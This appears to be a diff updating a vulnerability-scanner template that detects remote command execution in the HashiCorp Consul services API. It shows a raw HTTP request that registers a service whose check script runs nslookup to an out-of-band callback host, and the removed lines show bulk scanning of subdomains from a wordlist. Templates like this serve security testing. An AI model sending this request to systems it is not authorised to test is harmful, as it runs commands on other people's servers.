@@ -1,26 +1,23 @@
 id: hashicorp-consul-rce
 
 info:
-  name: Hashicorp Consul Services Api RCE
+  name: Hashicorp Consul Services API - Remote Code Execution
   author: pikpikcu
   severity: critical
-  reference: https://www.exploit-db.com/exploits/46074
-  tags: hashicorp,rce,oob
+  description: Hashicorp Consul Services API is vulnerable to an attack that can be leveraged to perform remote command execution on Consul nodes.
+  reference:
+    - https://www.exploit-db.com/exploits/46074
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-77
+  tags: hashicorp,rce,oast,intrusive,edb
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
-
-    raw:
-      - |
+  - raw:
+      - | # Create USER
         PUT /v1/agent/service/register HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
-        Connection: close
-        Upgrade-Insecure-Requests: 1
-        Content-Length: 205
+        Host: {{Hostname}}
 
         {
           "ID": "{{randstr}}",
@@ -28,8 +25,16 @@ requests:
           "Address": "127.0.0.1",
           "Port": 80,
           "check": {
-            "script": "nslookup {{Host}}.{{Port}}.{{Subdomains}}.hashicorp.{{MY-DOMAIN}}",
+            "script": "nslookup {{interactsh-url}}",
             "interval": "10s",
             "Timeout": "86400s"
           }
         }
+
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+# Enhanced by mp on 2022/06/01
